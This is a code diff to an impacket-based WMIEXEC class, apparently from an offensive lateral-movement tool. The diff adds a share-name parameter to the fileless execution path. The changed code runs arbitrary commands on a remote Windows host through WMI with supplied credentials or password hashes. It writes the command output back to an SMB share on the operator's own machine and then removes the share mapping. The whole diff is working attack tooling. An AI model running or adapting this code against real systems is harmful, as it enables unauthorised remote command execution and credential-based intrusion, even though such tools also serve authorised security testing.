@@ -13,7 +13,7 @@ from impacket.dcerpc.v5.dtypes import NULL
 
 
 class WMIEXEC:
-    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None, port="80"):
+    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None, port=445):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -50,11 +50,11 @@ class WMIEXEC:
         self.__win32Process,_ = iWbemServices.GetObject('Win32_Process')
 
 
-    def execute(self, command, output=False):
+    def execute(self, command, alea, output=False):
         self.__retOutput = output
         if self.__retOutput:
             self.__smbconnection.setTimeout(100000)
-        self.execute_handler(command)
+        self.execute_handler(command, alea)
         self.__dcom.disconnect()
         return self.__outputBuffer
 
@@ -71,10 +71,10 @@ class WMIEXEC:
     def output_callback(self, data):
         self.__outputBuffer += data
 
-    def execute_handler(self, data):
+    def execute_handler(self, data, alea):
         if self.__retOutput:
             try:
-                self.execute_fileless(data)
+                self.execute_fileless(data, alea)
             except:
                 self.cd('\\')
                 self.execute_remote(data)
@@ -90,12 +90,12 @@ class WMIEXEC:
         self.__win32Process.Create(command, self.__pwd, None)
         self.get_output_remote()
 
-    def execute_fileless(self, data):
+    def execute_fileless(self, data, alea):
         self.__output = gen_random_string(6)
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
-        command = self.__shell + data + ' 1> tmp\\{} 2>&1 & popd'.format(self.__output)
-        #command = self.__shell + data + ' 1> \\\\{}@{}\\misc\\tmp\\{} 2>&1'.format(local_ip, self.__port, self.__output)
+        command = self.__shell + data + ' 1> \\\\{}\\{}\\tmp\\{} 2>&1 & net use \\\\{}\\{} /del'.format(local_ip, alea, self.__output, local_ip, alea)
         logging.debug('Executing command: ' + command)
+        print(command)
         self.__win32Process.Create(command, self.__pwd, None)
         self.get_output_fileless()
 
